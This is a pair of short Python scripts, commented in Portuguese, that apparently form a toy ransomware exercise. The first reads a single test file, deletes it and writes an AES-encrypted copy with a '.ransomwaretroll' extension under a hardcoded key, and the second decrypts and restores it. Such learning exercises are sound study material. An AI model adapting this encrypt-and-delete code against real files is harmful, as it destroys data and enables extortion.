import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "exemplos/teste.txt"
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
with open(new_file, 'wb') as f:
    f.write(crypto_data)

import os
import pyaes

# Abrir o arquivo criptografado
file_name = "exemplos/teste.txt.ransomwaretroll"
with open(file_name, "rb") as file:
    file_data = file.read()

# Chave de descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Descriptografar o arquivo
decrypt_data = aes.decrypt(file_data)

# Remover o arquivo criptografado
os.remove(file_name)

# Criar o arquivo descriptografado
new_file = "exemplos/teste.txt"
with open(new_file, "wb") as f:
    f.write(decrypt_data)

